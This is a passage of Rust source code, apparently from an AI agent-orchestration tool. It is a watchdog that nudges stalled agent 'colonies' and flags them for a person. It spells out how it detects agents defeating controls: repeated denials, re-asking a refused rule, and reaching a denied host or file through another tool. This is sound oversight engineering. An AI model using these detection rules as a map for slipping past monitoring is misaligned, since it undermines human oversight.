//! Watchdog module: notices colonies that stopped making progress, nudges them, and flags them for
//! the user when nudging doesn't help. The decision is a pure function so it can be tested with a
//! fixed clock; the loop around it runs once a minute.

use crate::boundary::Boundary;
use crate::{
    Shared,
    orgs::effective_watchdog,
    protocol::Origin,
    sessions::{Runtime, Session, SessionStatus},
};
use chrono::{DateTime, Duration, Utc};
use serde_json::{Value, json};
use std::collections::{HashMap, VecDeque};
use std::sync::{Arc, atomic::Ordering};

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct WatchdogSettings {
    pub enabled: bool,
    pub stall_minutes: u64,
    pub max_nudges: u64,
    pub waiting_minutes: u64,
}

/// Per-colony progress bookkeeping, kept in the colony's runtime.
#[derive(Clone, Debug)]
pub struct Activity {
    pub last: DateTime<Utc>,
    /// When this colony's Runtime was materialised — its admission instant, stamped once at
    /// [`Activity::new`] and *never moved*, not by progress and not by
    /// [`Activity::note_gateway_busy`] (issue #760). In memory like the rest of `Activity`, so a
    /// restart re-stamps it and the window starts over — the safe direction. See
    /// [`starting_reference`].
    pub admitted_at: DateTime<Utc>,
    pub nudges: u64,
    pub last_nudge: Option<DateTime<Utc>>,
    pub question_since: Option<DateTime<Utc>>,
    /// Questions autonomous mode has answered for this colony, against its own cap.
    pub judged: u64,
    /// Judged attempts in a row that failed short of a refusal — a provider that could not be
    /// reached, an HTTP error, a reply that could not be used. A good answer or a cleared
    /// question resets it; enough in a row and the judge stops retrying, so the question reaches
    /// a person.
    pub judge_failures: u64,
    /// The question id whose above-the-ceiling note is already in the log, so the judge's
    /// once-per-question "left for you" line does not repeat every half-minute tick.
    pub risk_announced: Option<String>,
    /// Automatic recoveries the recovery point (`recovery.rs`) has chosen for this colony, against
    /// its own per-colony cap (issue #586). In memory like the rest of `Activity`: a restart resets
    /// it, which at worst allows a few more automatic recoveries than the cap names.
    pub recoveries: u32,
    /// Consecutive errored `tool_result` events carrying a `denial`, with no successful result
    /// between them (issue #609). A colony circling a boundary it cannot cross is not making
    /// progress, and this is what `decide` and the nudge read. In memory like the rest: a restart
    /// forgets the streak, which at worst lets one loop go a nudge longer before it is noticed.
    pub denials: u32,
    /// `last` as it stood just before the streak began — the last real progress. While the streak
    /// stands, `last` moves with each retried call, so this is the reference `decide` reads.
    pub denied_since: Option<DateTime<Utc>>,
    /// The class and hint of the latest denial, so the nudge can name what was denied.
    pub last_denial: Option<(String, String)>,
    /// The colony's recent `boundary` events, for the control-defeat signature (issue #609).
    pub boundaries: BoundaryTrail,
}

/// Consecutive denied tool results that make a hint loop (issue #609): two, so one denial — a
/// one-off the agent works around — is not one.
pub const HINT_LOOP_DENIALS: u32 = 2;

impl Activity {
    pub fn new(now: DateTime<Utc>) -> Self {
        Self {
            last: now,
            admitted_at: now,
            nudges: 0,
            last_nudge: None,
            question_since: None,
            judged: 0,
            judge_failures: 0,
            risk_announced: None,
            recoveries: 0,
            denials: 0,
            denied_since: None,
            last_denial: None,
            boundaries: BoundaryTrail::default(),
        }
    }

    /// The active hint loop (issue #609), when the denial streak has reached its threshold: how
    /// many denials in a row, the class of the last, and its hint. `None` when no loop stands.
    pub fn hint_loop(&self) -> Option<(u32, &str, &str)> {
        let (class, hint) = self.last_denial.as_ref()?;
        (self.denials >= HINT_LOOP_DENIALS).then_some((self.denials, class.as_str(), hint.as_str()))
    }

    /// The time the watchdog counts progress from (issue #609): `denied_since` while a hint loop
    /// stands — the loop's own retries and text are not progress — and `last` otherwise. The
    /// `since` stamps and `recovery::handle`'s `minutes_since_progress` read this too, so they do
    /// not report the retry time.
    pub fn progress_reference(&self) -> DateTime<Utc> {
        match self.denied_since {
            Some(since) if self.denials >= HINT_LOOP_DENIALS => since,
            _ => self.last,
        }
    }

    /// A request waiting on a slow model through the gateway is progress (issue #760): the stall
    /// clock and the nudge budget reset. It restarts the hint loop's clock too (issue #609), or
    /// `decide` would still read the old `denied_since` and nudge a looping colony on every other
    /// tick; the streak itself stands, so the nudge can still name what was denied.
    fn note_gateway_busy(&mut self, now: DateTime<Utc>) {
        self.last = now;
        self.nudges = 0;
        self.last_nudge = None;
        if self.denials > 0 {
            self.denied_since = Some(now);
        }
    }

    /// Ends the denial streak (issue #609): a successful result, a person's word, a question or a
    /// turn end shows the colony is no longer simply circling a refused call.
    fn break_denial_loop(&mut self) {
        self.denials = 0;
        self.denied_since = None;
        self.last_denial = None;
    }
}

/// Folds one line that counts as watchdog progress into the colony's denial streak (issue #609),
/// returning whether the line is a denial — the one case the watchdog must not read as progress.
/// An errored `tool_result` carrying a `denial` extends the streak (its `denied_since` is the `last`
/// where the streak began, kept from the first denial). A successful result ends it, and so does a
/// real break in the loop — a person's message, a question, a turn end. An error with no denial, and
/// any other line, leaves the streak as it stands.
pub fn note_denials(activity: &mut Activity, kind: &str, event: &serde_json::Value) -> bool {
    match kind {
        "tool_result" if event["is_error"] == true => {
            let Some(denial) = event.get("denial") else {
                return false;
            };
            if activity.denials == 0 {
                activity.denied_since = Some(activity.last);
            }
            activity.denials += 1;
            activity.last_denial = Some((
                denial["class"].as_str().unwrap_or("policy").to_string(),
                denial["hint"].as_str().unwrap_or_default().to_string(),
            ));
            true
        }
        "tool_result" | "user_message" | "question" | "turn_end" => {
            activity.break_denial_loop();
            false
        }
        _ => false,
    }
}

/// The control-defeat signature's window for repeated denials (issue #609): this many minutes.
pub const CONTROL_DEFEAT_WINDOW_MINUTES: i64 = 10;
/// Denials of one control within [`CONTROL_DEFEAT_WINDOW_MINUTES`] that make the repeated-denial
/// signature: three, so a one-off refusal the agent works around, and a single retry, are not one.
pub const REPEATED_DENIALS: usize = 3;
/// How long a refused target is remembered for the deny-then-reach signature, in minutes.
pub const REACH_WINDOW_MINUTES: i64 = 30;
/// The most boundary events kept per colony, and the most tool calls held as possibly reaching one.
const TRAIL_CAP: usize = 64;
/// The attention reason the control-defeat signature raises.
pub const CONTROL_DEFEAT_REASON: &str = "control_defeat";

/// A colony's recent `boundary` events (issue #609), with the host time each arrived: what the
/// control-defeat signature reads. In memory like the rest of `Activity`: a restart forgets the
/// trail, which at worst lets a pattern that straddles it go unflagged.
#[derive(Clone, Debug, Default)]
pub struct BoundaryTrail {
    recent: VecDeque<(DateTime<Utc>, Boundary)>,
    /// Tool calls in flight whose input names a refused target, by `tool_call_id`: a successful
    /// result for one is the deny-then-reach signature.
    reaching: HashMap<String, Boundary>,
}

/// A control-defeat signature that fired (issue #609): which pattern, a sentence for a person, and
/// the boundary events that are its evidence.
#[derive(Clone, Debug, PartialEq)]
pub struct Defeat {
    pub signature: &'static str,
    pub summary: String,
    pub evidence: Vec<Boundary>,
}

impl BoundaryTrail {
    fn prune(&mut self, now: DateTime<Utc>) {
        let horizon = now - Duration::minutes(REACH_WINDOW_MINUTES.max(CONTROL_DEFEAT_WINDOW_MINUTES));
        self.recent.retain(|(seen, _)| *seen >= horizon);
        while self.recent.len() > TRAIL_CAP {
            self.recent.pop_front();
        }
    }

    /// Drops the events a fired signature used, so the same evidence never flags twice and a new
    /// flag needs a fresh pattern.
    fn consume(&mut self, used: &[Boundary]) {
        self.recent.retain(|(_, b)| !used.contains(b));
    }

    /// How many boundary events the trail holds (tests and the cockpit's evidence count).
    pub fn len(&self) -> usize {
        self.recent.len()
    }
}

/// Folds one `boundary` event into the colony's trail and returns the control-defeat signature it
/// completes, if any (issue #609, docs/boundaries.md "Watchdog signatures"). Pure, with the host's
/// receive time passed in, so every rule is pinned with a fixed clock:
///
/// - **publish_rewrite** — any `publish_rewrite_refused`: publish found colony output crossing its
///   wall (a rewritten `.git`, a tree that moved after its approval). One is enough.
/// - **ask_bypass** — any `exec_policy_ask_bypass_attempt`: a rule a person refused asked again.
/// - **repeated_denial** — [`REPEATED_DENIALS`] denials of the same control (kind and control)
///   within [`CONTROL_DEFEAT_WINDOW_MINUTES`]: retrying a refused action with trivial variations
///   matches the same rule each time. One denial, or two, is a wall the colony works around.
///
/// A `path_policy_unbound` alone fires nothing — it is the host failing to apply a bind, normal
/// off Linux — but its target joins the deny-then-reach watch like any other.
pub fn note_boundary(trail: &mut BoundaryTrail, boundary: Boundary, now: DateTime<Utc>) -> Option<Defeat> {
    trail.prune(now);
    trail.recent.push_back((now, boundary.clone()));
    trail.prune(now);
    let defeat = match boundary.kind.as_str() {
        "publish_rewrite_refused" => Some(Defeat {
            signature: "publish_rewrite",
            summary: format!("publish refused colony output that crossed its wall ({})", boundary.control),
            evidence: vec![boundary],
        }),
        "exec_policy_ask_bypass_attempt" => {
            let evidence: Vec<Boundary> = trail
                .recent
                .iter()
                .filter(|(_, b)| b.control == boundary.control)
                .map(|(_, b)| b.clone())
                .collect();
            Some(Defeat {
                signature: "ask_bypass",
                summary: format!("the colony retried `{}` after its ask was refused", boundary.control),
                evidence,
            })
        }
        "path_policy_unbound" => None,
        _ => {
            let since = now - Duration::minutes(CONTROL_DEFEAT_WINDOW_MINUTES);
            let evidence: Vec<Boundary> = trail
                .recent
                .iter()
                .filter(|(seen, b)| *seen >= since && b.kind == boundary.kind && b.control == boundary.control)
                .map(|(_, b)| b.clone())
                .collect();
            (evidence.len() >= REPEATED_DENIALS).then(|| Defeat {
                signature: "repeated_denial",
                summary: format!(
                    "`{}` refused the colony {} times in {CONTROL_DEFEAT_WINDOW_MINUTES} min",
                    boundary.control,
                    evidence.len()
                ),
                evidence,
            })
        }
    };
    if let Some(defeat) = &defeat {
        trail.consume(&defeat.evidence);
    }
    defeat
}

/// Whether a tool call's input names a refused target: a host as a URL's or an address's host
/// (`://host`, `@host`), a path as a whole path token — `.env` is not `.env.example`.
pub fn reaches(input: &str, target: &str) -> bool {
    if target.len() < 3 {
        return false;
    }
    let is_host = !target.contains('/') && !target.starts_with('.') && !target.starts_with('~') && target.contains('.');
    if is_host {
        let host = target.to_ascii_lowercase();
        let text = input.to_ascii_lowercase();
        return [format!("://{host}"), format!("@{host}")].iter().any(|prefix| {
            text.match_indices(prefix.as_str()).any(|(at, m)| {
                let next = text[at + m.len()..].chars().next();
                !next.is_some_and(|c| c.is_ascii_alphanumeric() || c == '.' || c == '-')
            })
        });
    }
    let path_char = |c: char| c.is_alphanumeric() || matches!(c, '.' | '_' | '-' | '/' | '~');
    input.match_indices(target).any(|(at, m)| {
        let before = input[..at].chars().next_back();
        let after = input[at + m.len()..].chars().next();
        let clean_before = match before {
            None => true,
            // `./.env` names `.env`; `config/.env` is another file.
            Some('/') => input[..at].ends_with("./") && !input[..at].ends_with("../"),
            Some(c) => !path_char(c),
        };
        clean_before && !after.is_some_and(path_char)
    })
}

/// A tool call opened (issue #609): when its input names a target a control refused within
/// [`REACH_WINDOW_MINUTES`], it is held, so its result can tell whether the refused thing was then
/// reached another way.
pub fn note_reach_call(trail: &mut BoundaryTrail, tool_call_id: &str, input: &Value, now: DateTime<Utc>) {
    trail.prune(now);
    let text = input.to_string();
    let since = now - Duration::minutes(REACH_WINDOW_MINUTES);
    let hit = trail
        .recent
        .iter()
        .rev()
        .find(|(seen, b)| *seen >= since && b.target.as_deref().is_some_and(|target| reaches(&text, target)));
    if let Some((_, boundary)) = hit
        && trail.reaching.len() < TRAIL_CAP
    {
        trail.reaching.insert(tool_call_id.to_string(), boundary.clone());
    }
}

/// A tool call's result (issue #609): the **deny_then_reach** signature fires when a call held by
/// [`note_reach_call`] succeeded — the egress-denied host reached, the refused write target written
/// through another tool. An errored result is the wall holding again, not a defeat.
pub fn note_reach_result(trail: &mut BoundaryTrail, tool_call_id: &str, is_error: bool) -> Option<Defeat> {
    let boundary = trail.reaching.remove(tool_call_id)?;
    if is_error {
        return None;
    }
    trail.consume(std::slice::from_ref(&boundary));
    Some(Defeat {
        signature: "deny_then_reach",
        summary: format!(
            "a tool call ({tool_call_id}) reached `{}` after `{}` refused it ({})",
            boundary.target.as_deref().unwrap_or_default(),
            boundary.control,
            boundary.kind
        ),
        evidence: vec![boundary],
    })
}

/// Raises the control-defeat flag on a colony (issue #609): the attention item carries the
/// signature, a sentence and the boundary events that are its evidence, and the log says why. Not a
/// stop: a signature is a pattern, not proof, so a person decides (docs/boundaries.md). A colony
/// already flagged for control-defeat keeps its first evidence and gets a log line only.
pub(crate) async fn flag_control_defeat(app: &Shared, id: &str, defeat: Defeat) {
    let Some(s) = app.session(id).await else { return };
    let message = format!(
        "watchdog: control-defeat signature ({}): {}; this colony needs you",
        defeat.signature, defeat.summary
    );
    let already = s.attention.as_ref().and_then(|a| a["reason"].as_str()) == Some(CONTROL_DEFEAT_REASON);
    if !already {
        let evidence: Vec<Value> = defeat.evidence.iter().map(Boundary::to_event).collect();
        let since = Utc::now();
        app.update_session(id, |x| {
            x.attention = Some(json!({
                "reason": CONTROL_DEFEAT_REASON,
                "since": since,
                "nudges": 0,
                "signature": defeat.signature,
                "detail": defeat.summary,
                "evidence": evidence,
            }));
        })
        .await;
    }
    app.session_log_as(Origin::Watchdog, id, "error", message).await;
}

/// How long a colony may sit in `starting` after its boot has *finished* and its agent still has
/// not linked (issue #760). Sized off what is left once `start_link` has run (`boot.rs:2132`): a
/// websocket to an agentd that answered `/v1/health` moments earlier (`boot.rs:2118`), retried with
/// a backoff capped at 10 s (`events.rs:159`) — a transport that connects in seconds or not at all.
const BOOT_LINK_DEADLINE_MINUTES: i64 = 15;

/// How long a colony may sit in `starting` when its boot has not finished — the other half of the
/// same question, and a much larger one. The bounded phases alone come to 810 s: the mesh join's
/// 120 s (`boot.rs:2099`), the agentd health wait's 90 s and up to `MAX_RESTORE_WAIT_SECS = 600`
/// (`boot.rs:2116`, `boot.rs:717`). The image pre-pull (`boot.rs:2075`) is explicitly unbounded
/// ("can take a while"), as is `msb run --detach` (`sandbox.rs:63`). This floor is deliberately far
/// above the bounded total: it catches a boot that is *wedged*, not one that is slow.
const BOOT_DEADLINE_MINUTES: i64 = 45;

/// The instant a `starting` colony's agent link was given its chance to come up, and how long it
/// has had it.
///
/// Deliberately not `stall_minutes`, which measures time without progress in an *already-running*
/// colony and is clamped as low as 1 minute (`orgs.rs:699`), so keying this off it would flag
/// nearly every boot.
///
/// `Activity::admitted_at` is stamped when the Runtime is materialised (`sessions/runtime.rs:296`),
/// which the queue does *before* it spawns the boot — the admission log line at `queue.rs:672`
/// (through `sessions/persist.rs:216`), then `tokio::spawn(boot(…))` at `queue.rs:688` — so it is at
/// or a moment before the boot's own start, the right origin for both cases below, and the one
/// clock here gateway traffic cannot move. A colony whose agent is permanently retrying against
/// the gateway — the case issue #760 names — would otherwise have this window restarted on every
/// tick and never be flagged at all.
///
/// `boot_timing` is what makes the boot itself separable: cleared on every claim
/// (`queue.rs:375`, `lifecycle.rs:1138`) and published phase by phase *without* `total_ms` while
/// the boot runs (`boot.rs:788`), it gains `total_ms` at exactly one place — `boot.rs:2129`, right
/// after the agentd health wait and right before `start_link` (`boot.rs:2132`) — the boot's own
/// wall clock from where the boot began. So:
///
/// - `Some(ms)` — the boot finished. Reference `admitted_at + ms`, the instant it handed over to
///   the link, which then gets [`BOOT_LINK_DEADLINE_MINUTES`].
/// - `None` — the boot is still running or stopped part way, and so has no link to wait on.
///   Reference `admitted_at` with the whole [`BOOT_DEADLINE_MINUTES`].
///
/// One clock for both, so the pair cannot disagree. Were `admitted_at` ever *after* the boot's
/// start, a boot-end reference would sit slightly early — lengthening the window, the safe way.
fn starting_reference(activity: &Activity, boot_total_ms: Option<u64>) -> (DateTime<Utc>, i64) {
    match boot_total_ms {
        Some(ms) => (
            activity.admitted_at + Duration::milliseconds(ms as i64),
            BOOT_LINK_DEADLINE_MINUTES,
        ),
        None => (activity.admitted_at, BOOT_DEADLINE_MINUTES),
    }
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Observed {
    Working,
    WaitingForAnswer,
    /// Admitted and booting, but the agent has not linked yet (issue #760): nobody to nudge, so
    /// this state can only end in a flag or nothing. `boot_total_ms` is the session's
    /// `boot_timing.total_ms`; see [`starting_reference`].
    Starting {
        boot_total_ms: Option<u64>,
    },
    Other,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub enum Decision {
    Nothing,
    Nudge,
    Flag(&'static str),
    Clear,
}

/// Attention reasons the watchdog sets and may clear; others (such as `autopilot_held`) belong to their setter.
/// Shared with usage.rs, which buckets them as its closed failure labels.
pub(crate) const WATCHDOG_REASONS: [&str; 3] = ["stalled", "waiting_for_answer", "nudges_exhausted"];

pub fn decide(
    settings: &WatchdogSettings,
    now: DateTime<Utc>,
    state: Observed,
    activity: &Activity,
    attention: Option<&str>,
) -> Decision {
    if !settings.enabled {
        let ours = attention.is_some_and(|reason| WATCHDOG_REASONS.contains(&reason));
        return if ours { Decision::Clear } else { Decision::Nothing };
    }
    match state {
        Observed::WaitingForAnswer => {
            let waited = activity
                .question_since
                .map(|since| now - since)
                .unwrap_or_else(Duration::zero);
            if waited >= Duration::minutes(settings.waiting_minutes as i64) && attention != Some("waiting_for_answer") {
                Decision::Flag("waiting_for_answer")
            } else {
                Decision::Nothing
            }
        }
        Observed::Working => {
            // A hint loop reads `denied_since` rather than the `last` its retries keep moving
            // (issue #609); a nudge's `last_nudge` still restarts the wait.
            let reference = activity.last_nudge.map_or(activity.progress_reference(), |nudge| {
                nudge.max(activity.progress_reference())
            });
            if now - reference < Duration::minutes(settings.stall_minutes as i64) {
                Decision::Nothing
            } else if activity.nudges < settings.max_nudges {
                Decision::Nudge
            } else if attention != Some("nudges_exhausted") {
                Decision::Flag("nudges_exhausted")
            } else {
                Decision::Nothing
            }
        }
        Observed::Starting { boot_total_ms } => {
            // A colony still `starting` past its deadline never got a turn out of its agent
            // (issue #760): its event stream has not linked, so nothing about it can be seen, and
            // a nudge would be a message to nobody. Straight to the flag, on the window
            // [`starting_reference`] measures.
            let (since, minutes) = starting_reference(activity, boot_total_ms);
            if now - since < Duration::minutes(minutes) {
                Decision::Nothing
            } else if attention.is_some_and(|reason| !WATCHDOG_REASONS.contains(&reason)) {
                // Someone else's flag is on the record — a quota card, an autopilot hold. It is
                // the more specific story, and rewriting it as a stall would drop the card.
                Decision::Nothing
            } else if attention != Some("stalled") {
                Decision::Flag("stalled")
            } else {
                Decision::Nothing
            }
        }
        Observed::Other => {
            if attention == Some("waiting_for_answer") {
                Decision::Clear
            } else {
                Decision::Nothing
            }
        }
    }
}

pub fn nudge_text(minutes: u64) -> String {
    let span = if minutes == 1 {
        "1 minute".to_string()
    } else {
        format!("{minutes} minutes")
    };
    format!(
        "Watchdog check: this colony has shown no progress for {span}. If a command or process is hanging, \
         stop it and try another way. If you need a decision from the maintainer, ask with a choice card. Otherwise, \
         continue the task and report what you're doing."
    )
}

/// How long a final `assistant_text` may stand with no tool call in flight, no open question and no
/// gateway request before the watchdog treats the still-open turn as wedged (issue #878). Two
/// minutes against the 60 s tick: a runner that is only thinking between blocks is left alone, and a
/// turn the runner will never end is finished within three.
const TURN_END_GRACE: Duration = Duration::seconds(120);

/// Whether a colony's quiet final answer is a turn the watchdog should finish (issue #878): the
/// runner said it was done, its final text is past the grace, and nothing is in flight — no tool
/// call, no open question, no request through the gateway. Pure, so every condition is pinned with a
/// fixed clock.
fn turn_end_due(
    now: DateTime<Utc>,
    final_text_at: Option<DateTime<Utc>>,
    open_tool_calls: usize,
    open_question: bool,
    gateway_busy: bool,
) -> bool {
    let Some(final_at) = final_text_at else { return false };
    now - final_at >= TURN_END_GRACE && open_tool_calls == 0 && !open_question && !gateway_busy
}

/// Whether agentd's `/v1/health` body says its runner is running. A body that cannot be read is not
/// a "yes": the finish runs only on an unambiguous liveness signal.
fn runner_running(body: &str) -> bool {
    serde_json::from_str::<Value>(body)
        .ok()
        .and_then(|v| v["agent"]["running"].as_bool())
        .unwrap_or(false)
}

/// Finishes a colony's turn the runner said was over but never ended (issue #878). The runner emits
/// its final `assistant_text` and then stops before `turn_end` — a wedge its own event stream can
/// never report — so the watchdog detects it and, when agentd still answers with its runner running,
/// synthesises the end: a `watchdog_turn_end` line goes on the record and the ordinary turn-end path
/// runs, so verification and publish proceed.
///
/// The probe is a liveness check only — that agentd and the runner process are up — not a reading of
/// the turn's state: agentd's `running` is process liveness, and the claude-code runner emits
/// `turn_end` only as it goes idle, so a wedged turn reads `working` either way. Whether the turn is
/// done is decided on the mothership side, by [`turn_end_due`]: no tool call in flight, no open
/// question, nothing through the gateway.
///
/// The claim is consumed only on the success path: a probe that times out leaves the final answer
/// standing, so the next tick retries rather than losing the recovery. The success path re-reads the
/// conditions after the probe — the probe can take ten seconds, and an agent that starts working in
/// that window is not interrupted. A later real `turn_end` is harmless — `pr_mark` (`events.rs`)
/// does not publish over an unchanged description, and a synthetic end carries no spend to
/// double-count.
async fn maybe_finish_turn(app: &Shared, s: &Session, rt: &Arc<Runtime>, settings: &WatchdogSettings, now: DateTime<Utc>) {
    if !settings.enabled || s.status != SessionStatus::Running {
        return;
    }
    let final_text_at = *rt.final_text_at.lock().await;
    let open_tool_calls = rt.open_tool_calls.lock().await.len();
    let open_question = rt.open_question.lock().await.is_some();
    let busy = app.gateway.colony_busy(&s.id);
    if !turn_end_due(now, final_text_at, open_tool_calls, open_question, busy) {
        return;
    }
    let final_at = final_text_at.expect("turn_end_due is true only with a final timestamp");
    match crate::sessions::agentd_http(app, s, "GET", "/v1/health").await {
        Ok((200, body)) if runner_running(&body) => {
            // The probe can take up to ten seconds, and the runner may have started working again in
            // that window — a tool call, a delta, a fresh question — or a request may have arrived
            // through the gateway. A busy agent is not interrupted: re-read the conditions now and
            // claim the end only if the final answer is the same one and the turn still reads quiet,
            // the compare and the clear under the one lock so a racing event cannot slip between them.
            let open_tool_calls = rt.open_tool_calls.lock().await.len();
            let open_question = rt.open_question.lock().await.is_some();
            let busy = app.gateway.colony_busy(&s.id);
            {
                let mut claim = rt.final_text_at.lock().await;
                if !(*claim == Some(final_at) && turn_end_due(now, *claim, open_tool_calls, open_question, busy)) {
                    return;
                }
                *claim = None;
            }
            crate::validation::emit_chain(
                app,
                &s.id,
                json!({"type": "watchdog_turn_end", "after_secs": (now - final_at).num_seconds()}),
            )
            .await;
            app.session_log_as(
                Origin::Watchdog,
                &s.id,
                "warn",
                "watchdog: the agent said it was done but its turn never ended; finishing the turn so the work can publish"
                    .into(),
            )
            .await;
            crate::usage::note_watchdog_turn_end();
            crate::events::finish_turn(app, &s.id, rt, false, None, None, None).await;
        }
        // agentd is up but its runner is not running: the status path already owns that state (an
        // `exited`/`error` runner is held or parked there), so this leaves it alone and consumes the
        // claim without a log.
        Ok((200, _)) => *rt.final_text_at.lock().await = None,
        // agentd itself is not answering, so its runner cannot be restarted through it. Leave the
        // claim standing: a transient probe failure must not lose the recovery, so the next tick
        // retries. Record it once per final answer, not every tick, and let the existing stall
        // handling (a nudge, then the flag) take over in the meantime.
        _ => {
            let first = {
                let mut logged = rt.final_text_logged.lock().await;
                let first = *logged != Some(final_at);
                *logged = Some(final_at);
                first
            };
            if first {
                app.session_log_as(
                    Origin::Watchdog,
                    &s.id,
                    "error",
                    "watchdog: the agent's turn never ended and agentd is not answering; leaving this to the stall handling"
                        .into(),
                )
                .await;
            }
        }
    }
}

/// The nudge for a hint loop (issue #609): a colony whose last calls were all denied is circling a
/// boundary, so the nudge names what was denied and asks for a different route rather than a retry.
pub fn hint_loop_text(denials: u32, class: &str, hint: &str) -> String {
    format!(
        "Watchdog check: your last {denials} tool calls were denied ({class}: {hint}). Retrying the same thing \
         will not get through; take a different route, or ask the maintainer with a choice card if you need the \
         boundary changed."
    )
}

/// Runs the watchdog forever, checking every live colony once a minute.
pub async fn run(app: Shared) {
    let mut tick = tokio::time::interval(std::time::Duration::from_secs(60));
    tick.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Skip);
    loop {
        tick.tick().await;
        check_all(&app).await;
    }
}

async fn check_all(app: &Shared) {
    // A colony blocked on an exhausted provider is flagged with the quota reason and left out of the
    // nudging below (issue #760): nudging it only sends another request the plan cannot answer.
    // `starting` colonies are included there — one whose agent never got a turn out would otherwise
    // sit in `starting` with no flag at all.
    let blocked = crate::quota_cards::flag_blocked(app).await;
    let sessions = app.sessions.read().await.clone();
    let modules = app.modules.read().await.clone();
    let now = Utc::now();
    // A suspended colony is skipped (issue #562): its microVM was removed on purpose and its link
    // with it, so there is nothing to nudge and the question is already a person's to answer — the
    // restore pass, not a nudge, brings it back.
    // `starting` colonies are no longer skipped outright (issue #760): one whose agent never linked
    // used to sit in `starting` forever, with nothing watching it. It is never nudged — there is no
    // agent to nudge — so all it can do here is take the boot flag, decided in `decide`. A
    // quota-blocked one is still left out: it already carries the quota reason and card.
    for s in sessions
        .into_iter()
        .filter(|s| s.status.is_live() && s.suspended.is_none() && !blocked.contains(&s.id))
    {
        let Some(rt) = app.runtimes.lock().await.get(&s.id).cloned() else {
            continue;
        };
        // A `waiting_for_answer` record with no question actually tracked is stuck (issue #981):
        // the question was answered — or an answer to an earlier question took its slot — and no
        // later runner status came to move the record on. The cockpit's "needs you" list and
        // `colonizer ask` both read that question, so leaving it is a colony that looks like it
        // wants an answer it cannot give. Reconcile on every tick, before any nudge decision:
        // nothing is pending, and `idle` is the quiet choice — a mid-turn colony's next `working`
        // promotes it, while an idle one is not nudged as though it had stalled. Ungated by
        // `settings.enabled`: this is correctness, not the attention feature that setting governs.
        if s.status == SessionStatus::WaitingForAnswer && rt.open_question().await.is_none() {
            app.update_session(&s.id, |x| {
                x.status = SessionStatus::Idle;
                x.attention = None;
            })
            .await;
            app.session_log_as(
                Origin::Watchdog,
                &s.id,
                "info",
                "watchdog: still waiting_for_answer but no question is pending; set back to idle".to_string(),
            )
            .await;
            continue;
        }
        let settings = effective_watchdog(&modules, &app.org_settings(&s.org));
        // A turn the runner said was over but never ended is finished first (issue #878): the agent
        // is done, so it must not also be nudged as though it had stalled.
        maybe_finish_turn(app, &s, &rt, &settings, now).await;
        let state = match s.status {
            // The evidence that separates "the agent has not linked" from "the boot is still
            // pulling an image" — see `starting_reference`.
            SessionStatus::Starting => Observed::Starting {
                boot_total_ms: s.boot_timing.as_ref().and_then(|t| t.get("total_ms")).and_then(Value::as_u64),
            },
            SessionStatus::Running => Observed::Working,
            SessionStatus::WaitingForAnswer => Observed::WaitingForAnswer,
            _ => Observed::Other,
        };
        let attention = s.attention.as_ref().and_then(|a| a["reason"].as_str()).map(String::from);
        // A control-defeat flag (issue #609) is a person's to look at: the watchdog neither nudges
        // over it nor replaces it with a stall flag, and gateway traffic does not lift it.
        if attention.as_deref() == Some(CONTROL_DEFEAT_REASON) {
            continue;
        }
        // A request waiting on a slow model through the gateway is progress, not a stall.
        if app.gateway.colony_busy(&s.id) {
            rt.activity.lock().await.note_gateway_busy(now);
            // Gateway traffic alone does not lift the watchdog's final flag (issue #760): an agent
            // retrying into a failing provider keeps the gateway busy without making progress, and
            // clearing the flag here left "this colony needs you" in the log with nothing in the
            // cockpit. Only a real agent event (events.rs) clears `nudges_exhausted`.
            // A stuck boot is in the same position (issue #760): the agent is evidently working —
            // it is what is making the requests — but its event stream never linked, so the colony
            // is still `starting` and still needs a person. `note_gateway_busy` above has already
            // restarted its clock; the flag stands. Deliberately narrow: a wider exemption would
            // also keep some *other* reason alive, a behaviour change nothing here asks for.
            if attention.as_deref().is_some_and(|reason| {
                reason != "waiting_for_answer"
                    && reason != "nudges_exhausted"
                    && !(s.status == SessionStatus::Starting && reason == "stalled")
            }) {
                app.update_session(&s.id, |x| x.attention = None).await;
                continue;
            }
            if attention.as_deref() == Some("nudges_exhausted") {
                continue;
            }
        }
        let activity = rt.activity.lock().await.clone();
        match decide(&settings, now, state, &activity, attention.as_deref()) {
            Decision::Nothing => {}
            Decision::Nudge => {
                // The recovery point (issue #586): nudging is the rule, and when the point is on Jev
                // may answer with another option. Off leaves this branch exactly as it was.
                let (action, did) = crate::recovery::handle(app, &s, crate::recovery::Failure::Stall, "nudge_agent", false).await;
                let nudges = activity.nudges + 1;
                {
                    let mut current = rt.activity.lock().await;
                    current.nudges = nudges;
                    current.last_nudge = Some(now);
                }
                match action {
                    // `ask_human` and `stop` hand the colony to a person: no message to the agent,
                    // the "needs you" flag instead. `stop` also interrupts the turn through the
                    // existing, non-destructive interrupt, so nothing further is pushed.
                    crate::recovery::Action::AskHuman | crate::recovery::Action::Stop => {
                        if action == crate::recovery::Action::Stop {
                            rt.send_command(json!({"type": "interrupt"}));
                            rt.interrupted.store(true, Ordering::SeqCst);
                        }
                        // The `stalled` flag the nudge sets, so the colony reads as needing you the
                        // same way; the log says whether Jev chose it or the cap forced it.
                        let why = if did == "cap" {
                            "the recovery cap was reached".to_string()
                        } else {
                            format!("Jev chose {}", action.as_str())
                        };
                        flag(
                            app,
                            &s.id,
                            "stalled",
                            activity.progress_reference(),
                            nudges,
                            format!(
                                "watchdog: {why} after {} min of no progress; this colony needs you",
                                settings.stall_minutes
                            ),
                        )
                        .await;
                    }
                    other => {
                        // The rule's own nudge is the watchdog's message, with the stall span in it;
                        // a hint loop names the boundary that was denied instead. A distinct recovery
                        // option keeps its own message, and the log below says which was sent.
                        let hint = activity.hint_loop();
                        let hint_used = other == crate::recovery::Action::NudgeAgent && hint.is_some();
                        let text = if hint_used {
                            let (denials, class, why) = hint.unwrap();
                            hint_loop_text(denials, class, why)
                        } else {
                            match other.agent_message() {
                                Some(text) => text.to_string(),
                                None => nudge_text(settings.stall_minutes),
                            }
                        };
                        crate::recovery::send_user_message(&rt, "watchdog", &text);
                        // A nudge keeps the log line it has always had; a hint loop and any other
                        // pick say which.
                        let message = if hint_used {
                            let (denials, class, _) = hint.unwrap();
                            format!(
                                "watchdog: {denials} tool calls denied in a row ({class}), nudged the agent ({nudges}/{})",
                                settings.max_nudges
                            )
                        } else if other == crate::recovery::Action::NudgeAgent {
                            format!(
                                "watchdog: no progress for {} min, nudged the agent ({nudges}/{})",
